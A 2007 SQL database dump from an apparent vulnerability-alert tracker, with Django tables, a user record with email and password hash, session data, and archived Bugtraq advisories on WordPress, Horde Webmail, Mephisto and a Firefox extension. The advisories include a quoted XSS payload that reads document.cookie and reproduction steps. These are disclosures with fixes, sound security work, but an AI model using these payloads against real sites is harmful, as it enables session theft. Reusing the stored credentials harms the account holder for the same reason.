SET FOREIGN_KEY_CHECKS = 0;
-- phpMyAdmin SQL Dump
-- version 2.8.2-Debian-0.2
-- http://www.phpmyadmin.net
-- 
-- Host: localhost
-- Generation Time: Apr 09, 2007 at 02:52 PM
-- Server version: 5.0.24
-- PHP Version: 5.1.6
-- 
-- Database: `vulntracker_criteria`
-- 

-- 
-- Dumping data for table `advisory`
-- 


-- 
-- Dumping data for table `alert_method`
-- 

INSERT IGNORE INTO `alert_method` (`id`, `name`, `desc`, `desc_long`) VALUES (1, 'rss', 'rss feeds', ''),
(2, 'mail', 'email', '');

-- 
-- Dumping data for table `app`
-- 


-- 
-- Dumping data for table `app_version`
-- 


-- 
-- Dumping data for table `auth_group`
-- 


-- 
-- Dumping data for table `auth_group_permissions`
-- 


-- 
-- Dumping data for table `auth_message`
-- 


-- 
-- Dumping data for table `auth_permission`
-- 

INSERT IGNORE INTO `auth_permission` (`id`, `name`, `content_type_id`, `codename`) VALUES (1, 'Can add message', 1, 'add_message'),
(2, 'Can change message', 1, 'change_message'),
(3, 'Can delete message', 1, 'delete_message'),
(4, 'Can add group', 2, 'add_group'),
(5, 'Can change group', 2, 'change_group'),
(6, 'Can delete group', 2, 'delete_group'),
(7, 'Can add user', 3, 'add_user'),
(8, 'Can change user', 3, 'change_user'),
(9, 'Can delete user', 3, 'delete_user'),
(10, 'Can add permission', 4, 'add_permission'),
(11, 'Can change permission', 4, 'change_permission'),
(12, 'Can delete permission', 4, 'delete_permission'),
(13, 'Can add content type', 5, 'add_contenttype'),
(14, 'Can change content type', 5, 'change_contenttype'),
(15, 'Can delete content type', 5, 'delete_contenttype'),
(16, 'Can add session', 6, 'add_session'),
(17, 'Can change session', 6, 'change_session'),
(18, 'Can delete session', 6, 'delete_session'),
(19, 'Can add site', 7, 'add_site'),
(20, 'Can change site', 7, 'change_site'),
(21, 'Can delete site', 7, 'delete_site'),
(22, 'Can add log entry', 8, 'add_logentry'),
(23, 'Can change log entry', 8, 'change_logentry'),
(24, 'Can delete log entry', 8, 'delete_logentry'),
(25, 'Can add alert method', 9, 'add_alertmethod'),
(26, 'Can change alert method', 9, 'change_alertmethod'),
(27, 'Can delete alert method', 9, 'delete_alertmethod'),
(28, 'Can add criteria type', 10, 'add_criteriatype'),
(29, 'Can change criteria type', 10, 'change_criteriatype'),
(30, 'Can delete criteria type', 10, 'delete_criteriatype'),
(31, 'Can add user criteria', 11, 'add_usercriteria'),
(32, 'Can change user criteria', 11, 'change_usercriteria'),
(33, 'Can delete user criteria', 11, 'delete_usercriteria'),
(34, 'Can add source', 12, 'add_source'),
(35, 'Can change source', 12, 'change_source'),
(36, 'Can delete source', 12, 'delete_source'),
(37, 'Can add message type', 13, 'add_messagetype'),
(38, 'Can change message type', 13, 'change_messagetype'),
(39, 'Can delete message type', 13, 'delete_messagetype'),
(40, 'Can add message', 14, 'add_message'),
(41, 'Can change message', 14, 'change_message'),
(42, 'Can delete message', 14, 'delete_message'),
(43, 'Can add criteria qualifier', 15, 'add_criteriaqualifier'),
(44, 'Can change criteria qualifier', 15, 'change_criteriaqualifier'),
(45, 'Can delete criteria qualifier', 15, 'delete_criteriaqualifier'),
(46, 'Can add user profile', 16, 'add_userprofile'),
(47, 'Can change user profile', 16, 'change_userprofile'),
(48, 'Can delete user profile', 16, 'delete_userprofile');

-- 
-- Dumping data for table `auth_user`
-- 

INSERT IGNORE INTO `auth_user` (`id`, `username`, `first_name`, `last_name`, `email`, `password`, `is_staff`, `is_active`, `is_superuser`, `last_login`, `date_joined`) VALUES (1, 'jon', '', '', 'jon.i.austin@gmail.com', 'sha1$4ad52$db7b677c41f217253672cc42bda00bbc0c9aecb0', 1, 1, 1, '2007-04-07 22:04:29', '2007-04-05 20:51:48');

-- 
-- Dumping data for table `auth_user_groups`
-- 


-- 
-- Dumping data for table `auth_user_user_permissions`
-- 


-- 
-- Dumping data for table `criteria_type`
-- 

INSERT IGNORE INTO `criteria_type` (`id`, `name`, `search_field`, `desc`, `input_type`) VALUES (1, 'subject', 'subject', '', 'text'),
(2, 'message body', 'body', '', 'text'),
(3, 'name', 'subject', 'Product/Application Name', 'text'),
(4, 'version', 'subject', 'Product/Application Version', 'text');

-- 
-- Dumping data for table `django_admin_log`
-- 

INSERT IGNORE INTO `django_admin_log` (`id`, `action_time`, `user_id`, `content_type_id`, `object_id`, `object_repr`, `action_flag`, `change_message`) VALUES (1, '2007-04-05 20:53:14', 1, 9, '1', 'rss', 1, ''),
(2, '2007-04-05 20:54:26', 1, 9, '2', 'mail', 1, ''),
(3, '2007-04-05 20:54:51', 1, 15, '1', 'contains', 1, ''),
(4, '2007-04-05 20:55:31', 1, 10, '1', 'subject', 1, ''),
(5, '2007-04-05 20:55:43', 1, 10, '2', 'message body', 1, ''),
(6, '2007-04-05 20:56:12', 1, 13, '1', 'mail', 1, ''),
(7, '2007-04-05 20:58:14', 1, 12, '1', 'bugtraq', 1, ''),
(8, '2007-04-05 21:32:22', 1, 9, '1', 'test', 1, ''),
(9, '2007-04-05 21:32:54', 1, 9, '1', 'rss', 2, 'Changed name and desc.'),
(10, '2007-04-05 21:32:55', 1, 9, '1', 'rss', 2, 'No fields changed.'),
(11, '2007-04-05 21:33:01', 1, 9, '2', 'mail', 1, ''),
(12, '2007-04-05 21:35:53', 1, 3, '1', 'jon', 2, 'Added user profile "jon". Changed staff status, active, superuser status, sources for user profile "jon" and alert methods for user profile "jon".'),
(13, '2007-04-06 11:36:57', 1, 3, '1', 'jon', 2, 'Added user criteria "foo". Changed staff status, active, superuser status, sources for user profile "jon" and alert methods for user profile "jon".'),
(14, '2007-04-06 11:37:15', 1, 3, '1', 'jon', 2, 'Added user criteria "bar". Changed staff status, active, superuser status, sources for user profile "jon" and alert methods for user profile "jon".'),
(15, '2007-04-07 17:48:42', 1, 15, '2', 'is', 1, ''),
(16, '2007-04-07 17:52:04', 1, 12, '2', 'Full Disclosure', 1, ''),
(17, '2007-04-07 17:53:30', 1, 12, '3', 'VulnWatch', 1, ''),
(18, '2007-04-07 17:58:26', 1, 15, '3', 'starts_with', 1, ''),
(19, '2007-04-07 17:58:52', 1, 15, '4', 'ends_with', 1, ''),
(20, '2007-04-07 17:59:03', 1, 15, '3', 'starts_with', 2, 'Changed sql.'),
(21, '2007-04-07 17:59:46', 1, 15, '5', 'not_start_with', 1, ''),
(22, '2007-04-07 18:00:06', 1, 15, '6', 'not_contains', 1, ''),
(23, '2007-04-07 18:04:05', 1, 15, '7', 'not_equal', 1, ''),
(24, '2007-04-07 18:04:33', 1, 15, '2', 'equals', 2, 'Changed name and desc.'),
(25, '2007-04-07 18:23:46', 1, 15, '8', 'regexp', 1, ''),
(26, '2007-04-07 18:26:26', 1, 15, '7', 'not_equal', 2, 'Changed desc.'),
(27, '2007-04-07 18:26:57', 1, 15, '2', 'equal to', 2, 'Changed name and desc.'),
(28, '2007-04-07 18:27:07', 1, 15, '2', 'equal to', 2, 'Changed desc.'),
(29, '2007-04-07 19:17:18', 1, 10, '3', 'Product/Application Name', 1, ''),
(30, '2007-04-07 19:17:31', 1, 10, '4', 'Product/Application Version', 1, ''),
(31, '2007-04-08 01:33:51', 1, 10, '4', 'version', 2, 'Changed name and desc.'),
(32, '2007-04-08 01:34:18', 1, 10, '3', 'name', 2, 'Changed name and desc.'),
(33, '2007-04-08 15:55:53', 1, 3, '1', 'jon', 2, 'Changed staff status, active, superuser status, value for user criteria "adf", value for user criteria "wer", sources for user profile "jon" and alert methods for user profile "jon".');

-- 
-- Dumping data for table `django_content_type`
-- 

INSERT IGNORE INTO `django_content_type` (`id`, `name`, `app_label`, `model`) VALUES (1, 'message', 'auth', 'message'),
(2, 'group', 'auth', 'group'),
(3, 'user', 'auth', 'user'),
(4, 'permission', 'auth', 'permission'),
(5, 'content type', 'contenttypes', 'contenttype'),
(6, 'session', 'sessions', 'session'),
(7, 'site', 'sites', 'site'),
(8, 'log entry', 'admin', 'logentry'),
(9, 'alert method', 'vulnalert', 'alertmethod'),
(10, 'criteria type', 'vulnalert', 'criteriatype'),
(11, 'user criteria', 'vulnalert', 'usercriteria'),
(12, 'source', 'vulnalert', 'source'),
(13, 'message type', 'vulnalert', 'messagetype'),
(14, 'message', 'vulnalert', 'message'),
(15, 'criteria qualifier', 'vulnalert', 'criteriaqualifier'),
(16, 'user profile', 'vulnalert', 'userprofile');

-- 
-- Dumping data for table `django_session`
-- 

INSERT IGNORE INTO `django_session` (`session_key`, `session_data`, `expire_date`) VALUES ('003e35553a2387994927e471a240d765', 'KGRwMQpTJ3Rlc3Rjb29raWUnCnAyClMnd29ya2VkJwpwMwpzUydfYXV0aF91c2VyX2lkJwpwNApM\nMUwKc1MnX2F1dGhfdXNlcl9iYWNrZW5kJwpwNQpTJ3Z1bG50cmFja2VyLmF1dGguYXV0aF9lbWFp\nbC5FbWFpbEJhY2tlbmQnCnA2CnMuMjZiNDM5MGIxYjk3MzA4MTU0MzdmMTVmOGJjMGYyMDU=\n', '2007-04-21 21:08:55'),
('023e0290062816d42ea2830dcf3cecce', 'KGRwMQpTJ19hdXRoX3VzZXJfYmFja2VuZCcKcDIKUyd2dWxudHJhY2tlci5hdXRoLmF1dGhfZW1h\naWwuRW1haWxCYWNrZW5kJwpwMwpzUydfYXV0aF91c2VyX2lkJwpwNApMMUwKcy44ZGRmM2ZlNzlj\nZDIwOWZkOGE5M2U1ZTg5MTAwMmY0Ng==\n', '2007-04-19 20:52:01'),
('176cf7049bbc4eb58fe7babd91689d80', 'KGRwMQpTJ3Rlc3Rjb29raWUnCnAyClMnd29ya2VkJwpwMwpzLjFjNjMxNzZhZjA2OWQ0Mzg0ZjRk\nYzIzOTY2ZWZmNDc1\n', '2007-04-22 14:49:21'),
('a2ea007807b4ec4abdfca93244a44cd2', 'KGRwMQpTJ19hdXRoX3VzZXJfYmFja2VuZCcKcDIKUyd2dWxudHJhY2tlci5hdXRoLmF1dGhfZW1h\naWwuRW1haWxCYWNrZW5kJwpwMwpzUydfYXV0aF91c2VyX2lkJwpwNApMMUwKcy44ZGRmM2ZlNzlj\nZDIwOWZkOGE5M2U1ZTg5MTAwMmY0Ng==\n', '2007-04-19 20:52:31'),
('b4f3e17386d5ec15bac928ed6ff5b246', 'KGRwMQpTJ3Rlc3Rjb29raWUnCnAyClMnd29ya2VkJwpwMwpzLjFjNjMxNzZhZjA2OWQ0Mzg0ZjRk\nYzIzOTY2ZWZmNDc1\n', '2007-04-19 22:12:51'),
('c82ee18820987a9c149f132c19077b52', 'KGRwMQpTJ19hdXRoX3VzZXJfYmFja2VuZCcKcDIKUyd2dWxudHJhY2tlci5hdXRoLmF1dGhfZW1h\naWwuRW1haWxCYWNrZW5kJwpwMwpzUydfYXV0aF91c2VyX2lkJwpwNApMMUwKcy44ZGRmM2ZlNzlj\nZDIwOWZkOGE5M2U1ZTg5MTAwMmY0Ng==\n', '2007-04-21 22:04:29');

-- 
-- Dumping data for table `django_site`
-- 

INSERT IGNORE INTO `django_site` (`id`, `domain`, `name`) VALUES (1, 'example.com', 'example.com');

-- 
-- Dumping data for table `message`
-- 

INSERT IGNORE INTO `message` (`id`, `text`, `subject`, `body`, `message_type_id`, `source_id`, `processed`) VALUES (1, 'Return-Path: <bugtraq-return-31206-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx3.g.dreamhost.com\nReceived: from terminator.dreamhost.com (sd-green-bigip-66.dreamhost.com [208.97.132.66])\n   by spunkymail-mx3.g.dreamhost.com (Postfix) with ESMTP id 909168DC8C\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 08:48:59 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by terminator.dreamhost.com (Postfix) with ESMTP id 84E1EB8690\n    for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 08:48:58 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at terminator.dreamhost.com\nX-Spam-Score: -2.311\nX-Spam-Level: \nX-Spam-Status: No, score=-2.311 tagged_above=-999 required=999\n  tests=[BAYES_00=-2.312, UNPARSEABLE_RELAY=0.001]\nReceived: from terminator.dreamhost.com ([127.0.0.1])\n   by localhost (terminator.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n with ESMTP id NsHQYsMVrAkk for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 08:48:58 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.26])\n    by terminator.dreamhost.com (Postfix) with ESMTP id CF4DBB86C4\n    for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 08:48:57 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in2.mail.dreamhost.com [208.97.132.72]) with ESMTP; Mon, 26 Mar 2007 07:47:48 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing2.securityfocus.com (Postfix) with QMQP\n    id 62021143F9F; Mon, 26 Mar 2007 09:43:32 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 30930 invoked from network); 25 Mar 2007 03:50:12 -0000\nDate: 25 Mar 2007 03:50:56 -0000\nMessage-ID: <20070325035056.20485.qmail@securityfocus.com>\nContent-Type: text/plain\nContent-Disposition: inline\nContent-Transfer-Encoding: binary\nMIME-Version: 1.0\nX-Mailer: MIME-tools 5.411 (Entity 5.404)\nFrom: lj@subjectzero.net\nTo: bugtraq@securityfocus.com\nSubject: Path Disclosure  - Wordpress 2.1.2\n\nProduct : Wordpress 2.1.2\nVulnerability Details :\nAll the sites running on the latest version of wordpress 2.1.2 are exposed to a full path disclosure vulnerability.\n\nProof of Concept:\nhttp://www.anysite.com/Path_to_wordpress/wp-includes/vars.php\n\nError Returned:\n\nFatal error: Call to undefined function get_option() in /home/santoshp/public_html/wp-includes/vars.php on line 92\n\nLocation:\nwww.indiaesecure.com/exploits.htm/wp212.txt\n', 'Path Disclosure  - Wordpress 2.1.2', 'Product : Wordpress 2.1.2\nVulnerability Details :\nAll the sites running on the latest version of wordpress 2.1.2 are exposed to a full path disclosure vulnerability.\n\nProof of Concept:\nhttp://www.anysite.com/Path_to_wordpress/wp-includes/vars.php\n\nError Returned:\n\nFatal error: Call to undefined function get_option() in /home/santoshp/public_html/wp-includes/vars.php on line 92\n\nLocation:\nwww.indiaesecure.com/exploits.htm/wp212.txt\n', 1, 1, 0),
(2, 'Return-Path: <bugtraq-return-31205-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx3.g.dreamhost.com\nReceived: from enforcer.dreamhost.com (sd-green-bigip-66.dreamhost.com [208.97.132.66])\n    by spunkymail-mx3.g.dreamhost.com (Postfix) with ESMTP id DFC4A8D882\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:00:21 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by enforcer.dreamhost.com (Postfix) with ESMTP id 9962117D03A\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:00:21 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at enforcer.dreamhost.com\nX-Spam-Score: 0.001\nX-Spam-Level: \nX-Spam-Status: No, score=0.001 tagged_above=-999 required=999\n  tests=[UNPARSEABLE_RELAY=0.001]\nReceived: from enforcer.dreamhost.com ([127.0.0.1])\n  by localhost (enforcer.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n   with ESMTP id NAHFCnGHasbP for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 09:00:21 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.27])\n    by enforcer.dreamhost.com (Postfix) with ESMTP id 2495C17D02E\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:00:21 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in4.mail.dreamhost.com [208.97.132.73]) with ESMTP; Mon, 26 Mar 2007 07:53:59 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing3.securityfocus.com (Postfix) with QMQP\n    id 7E61E23750C; Mon, 26 Mar 2007 09:36:15 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 30086 invoked from network); 25 Mar 2007 03:22:56 -0000\nDate: 25 Mar 2007 03:24:00 -0000\nMessage-ID: <20070325032400.31468.qmail@securityfocus.com>\nContent-Type: text/plain\nContent-Disposition: inline\nContent-Transfer-Encoding: binary\nMIME-Version: 1.0\nX-Mailer: MIME-tools 5.411 (Entity 5.404)\nFrom: DoZ@HackersCenter.com\nTo: bugtraq@securityfocus.com\nSubject: Horde Webmail Multiple HTML Injection vulnerability\n\nHorde Webmail Multiple HTML Injection vulnerability\n\nHorde Groupware Webmail Edition is a free, enterprise ready, browser based communication suite. Users can read, send and organize email messages and manage and share calendars, contacts, tasks and notes with the standards compliant components from the Horde Project.\nAn attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks. A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation. Some XSS attacks can deface the Application, as shown in the proff of concept.\n\n\n\nHackers Center Security Group (http://www.hackerscenter.com)\nCredit: Doz\n\n\nRemote: No\nLocal: Yes\nClass: Input Validation Error\n\n\nApplication: Horde Webmail\nVendor: http://www.horde.org/\nVersion: 1.0\n\n\nExploit is not needed, Attackers can exploit these issues via a web client.\n\n\nVulnerable Files: search.php - rule.php\n\n\n/horde/imp/search.php\n\n/horde/ingo/rule.php\n\n\nLive Proff of Concept: (3/22/2007)\n\nhttp://demo.cpanel.net:2095/horde/index.php\n\nUser: Demo\nPass: Demo\n\n* Go to mail than Expand and Select Filters!\n\n\nPics Proff of Concept:\n\n- http://www.uploadimage.info/images/8943pic1.JPG\n- http://www.uploadimage.info/images/78230pic2.JPG\n\n\nSecurity researcher? Join us: mail Zinho at zinho at hackerscenter.com\n', 'Horde Webmail Multiple HTML Injection vulnerability', 'Horde Webmail Multiple HTML Injection vulnerability\n\nHorde Groupware Webmail Edition is a free, enterprise ready, browser based communication suite. Users can read, send and organize email messages and manage and share calendars, contacts, tasks and notes with the standards compliant components from the Horde Project.\nAn attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks. A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation. Some XSS attacks can deface the Application, as shown in the proff of concept.\n\n\n\nHackers Center Security Group (http://www.hackerscenter.com)\nCredit: Doz\n\n\nRemote: No\nLocal: Yes\nClass: Input Validation Error\n\n\nApplication: Horde Webmail\nVendor: http://www.horde.org/\nVersion: 1.0\n\n\nExploit is not needed, Attackers can exploit these issues via a web client.\n\n\nVulnerable Files: search.php - rule.php\n\n\n/horde/imp/search.php\n\n/horde/ingo/rule.php\n\n\nLive Proff of Concept: (3/22/2007)\n\nhttp://demo.cpanel.net:2095/horde/index.php\n\nUser: Demo\nPass: Demo\n\n* Go to mail than Expand and Select Filters!\n\n\nPics Proff of Concept:\n\n- http://www.uploadimage.info/images/8943pic1.JPG\n- http://www.uploadimage.info/images/78230pic2.JPG\n\n\nSecurity researcher? Join us: mail Zinho at zinho at hackerscenter.com\n', 1, 1, 0),
(3, 'Return-Path: <bugtraq-return-31207-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx4.g.dreamhost.com\nReceived: from carrie.dreamhost.com (sd-green-bigip-81.dreamhost.com [208.97.132.81])\n  by spunkymail-mx4.g.dreamhost.com (Postfix) with ESMTP id A3CE119A5B1\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:10:01 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by carrie.dreamhost.com (Postfix) with ESMTP id 90AB4C1FB\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:10:03 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at carrie.dreamhost.com\nX-Spam-Score: 0.001\nX-Spam-Level: \nX-Spam-Status: No, score=0.001 tagged_above=-999 required=999\n    tests=[UNPARSEABLE_RELAY=0.001]\nReceived: from carrie.dreamhost.com ([127.0.0.1])\n    by localhost (carrie.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n with ESMTP id 0mXiHMvGs10C for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 09:10:02 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.27])\n    by carrie.dreamhost.com (Postfix) with ESMTP id A2392C3D5\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:10:02 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in4.mail.dreamhost.com [208.97.132.73]) with ESMTP; Mon, 26 Mar 2007 08:03:41 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing3.securityfocus.com (Postfix) with QMQP\n    id 79B462372BB; Mon, 26 Mar 2007 09:50:17 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 9875 invoked from network); 25 Mar 2007 06:50:42 -0000\nMime-Version: 1.0 (Apple Message framework v752.3)\nContent-Transfer-Encoding: 7bit\nMessage-Id: <9DF7972C-0AAE-4E75-8882-5CB8B1DB73FF@haqu.net>\nContent-Type: text/plain; charset=US-ASCII; delsp=yes; format=flowed\nTo: bugtraq@securityfocus.com\nFrom: Sergey Tikhonov <st@haqu.net>\nSubject: Mephisto blog is vulnerable to XSS\nDate: Sun, 25 Mar 2007 12:52:39 +0700\nX-Mailer: Apple Mail (2.752.3)\n\nHello everyone!\n\nCurrent bleeding-edge version of Mephisto blog is vulnerable to XSS.  \nComment''s author name accept javascript code. If admin approves/ \nrejects comments manually, he have to load all unapproved comments,  \nso it''s possible to fetch his session id.\n\nExample\n\nAdd new comment with the following author name: <script>alert \n(document.cookie)</script>\nThen from admin''s overview section check this comment - you''ll see  \nmessage with cookie.\nIf you manually approve your comments, check list of pending comments.\n\nHow to fix it\n\npatch for <approot>/app/helpers/application_helper.rb :\n\n5c5\n<     return comment.author if comment.author_url.blank?\n---\n >     return h(comment.author) if comment.author_url.blank?\n\nBest wishes!\nSergey Tikhonov\n', 'Mephisto blog is vulnerable to XSS', 'Hello everyone!\n\nCurrent bleeding-edge version of Mephisto blog is vulnerable to XSS.  \nComment''s author name accept javascript code. If admin approves/ \nrejects comments manually, he have to load all unapproved comments,  \nso it''s possible to fetch his session id.\n\nExample\n\nAdd new comment with the following author name: <script>alert \n(document.cookie)</script>\nThen from admin''s overview section check this comment - you''ll see  \nmessage with cookie.\nIf you manually approve your comments, check list of pending comments.\n\nHow to fix it\n\npatch for <approot>/app/helpers/application_helper.rb :\n\n5c5\n<     return comment.author if comment.author_url.blank?\n---\n >     return h(comment.author) if comment.author_url.blank?\n\nBest wishes!\nSergey Tikhonov\n', 1, 1, 0),
(4, 'Return-Path: <bugtraq-return-31201-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx5.g.dreamhost.com\nReceived: from terminator.dreamhost.com (sd-green-bigip-74.dreamhost.com [208.97.132.74])\n  by spunkymail-mx5.g.dreamhost.com (Postfix) with ESMTP id 5AEDC40C25\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:12:28 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by terminator.dreamhost.com (Postfix) with ESMTP id 3F8C9B8681\n    for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:12:28 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at terminator.dreamhost.com\nX-Spam-Score: -2.311\nX-Spam-Level: \nX-Spam-Status: No, score=-2.311 tagged_above=-999 required=999\n  tests=[BAYES_00=-2.312, UNPARSEABLE_RELAY=0.001]\nReceived: from terminator.dreamhost.com ([127.0.0.1])\n   by localhost (terminator.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n with ESMTP id bQZE9jKvc8LZ for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 09:12:27 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.26])\n    by terminator.dreamhost.com (Postfix) with ESMTP id 444BDB86BE\n    for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:12:27 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in2.mail.dreamhost.com [208.97.132.72]) with ESMTP; Mon, 26 Mar 2007 08:11:17 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing2.securityfocus.com (Postfix) with QMQP\n    id 646C01436FE; Mon, 26 Mar 2007 09:27:36 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 11878 invoked from network); 24 Mar 2007 20:21:56 -0000\nDomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;\n  s=s1024; d=yahoo.com;\n  h=X-YMail-OSG:Received:Date:From:Subject:To:Cc:MIME-Version:Content-Type:Content-Transfer-Encoding:Message-ID;\n  b=L8S0wdAddKTDNPgN7kwD3UVsbZDj4oM6qrNBC6yZ57Z6JujpPVOTJL1UU/rJ0wOGp8Uc7VH9edmnTEq5L5MquTEYJvBJHrHrgQQG10O/d86jspuv+hEHR1d4RyLYtkL4IqhNebeHZytqfNQCgPh/R9IMlCFShzS5GBJ+XpS/HWA=;\nX-YMail-OSG: fJP.S_8VM1kJuGhNoyruDmXnW3fIYybdh_kB36S2kuB2kP9fHq7GI3pVQ12JiuwX791I9m4Z2XaaEZbw.Gp83Glk6M47C51piuro0.LhoBz_cJPCWpPmuLxcojKKQrat_hWpGwTqY.4olpMKdcH3.Pgjqg--\nDate: Sat, 24 Mar 2007 12:24:21 -0700 (PDT)\nFrom: CrYpTiC MauleR <crypticmauler@yahoo.com>\nSubject: Fizzle : Firefox Extension Vulnerability\nTo: full-disclosure@lists.grok.org.uk\nCc: bugtraq@securityfocus.com\nMIME-Version: 1.0\nContent-Type: text/plain; charset=iso-8859-1\nContent-Transfer-Encoding: 8bit\nMessage-ID: <429777.75183.qm@web39711.mail.mud.yahoo.com>\n\nFizzle allows feeds to use HTML in feed data resulting in JavaScript being\nrun in the chrome: window with chrome permissions. The extension will\nconvert HTML entities back to their ASCII equivalents thus &lt; becomes <\nand so forth. Various feeds fields are vulnerable including the title which\nallows the code to execute when Fizzle is opened and no need for the feed\nto be viewed.\n\nThe author Andy Frank was notified about the issue on 01/29/2007 we\ncorresponded on the issue and I even offered to create a patch which I did.\nThe patch did not meet his liking since the sanitation was too strict and\nmade some feeds who use certain tags like <p> for formatting to lose their\nlayout I told him it would be too difficult to sanitize the data unless its\nstrict because so many attack variations could be used, and best thing to\ndo is not allow HTML at all in the feed. On 02/20/2007 we ended discussions\non this and I notified addons.mozilla.org about the problem and the\ndevelopers lack of concern in fixing the extension or at least disabling\nits download so people would not download the extension. Well Mozilla\ndidn''t bother to remove it and have chosen to remove the extension in a\nfuture date when addons.mozilla.org is updated. Since then over 2,000+\nusers have additionally downloaded the extension, invoking me to go\nfull-disclosure about it.\nFizzle 0.5 (previous versions likely vulnerable as well)\nhttps://addons.mozilla.org/firefox/1307/\n\nBelow is the example I have tested out using version 0.5 and under nightly\nFirefox. Please note that the HTML entities must be present for the exploit\nto work. Place the below in your feed body and subscribe to the feed. View\nthe feed in Fizzle. When testing make sure 